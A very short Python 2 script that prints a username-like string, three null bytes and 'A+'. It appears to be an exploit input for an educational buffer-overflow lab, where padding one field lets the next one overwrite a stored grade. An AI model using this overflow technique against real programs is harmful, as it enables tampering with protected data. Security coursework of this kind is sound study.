def main():
	print "yhyuan2" + "\x00"*3 + "A+"

if __name__ == '__main__':
	main()
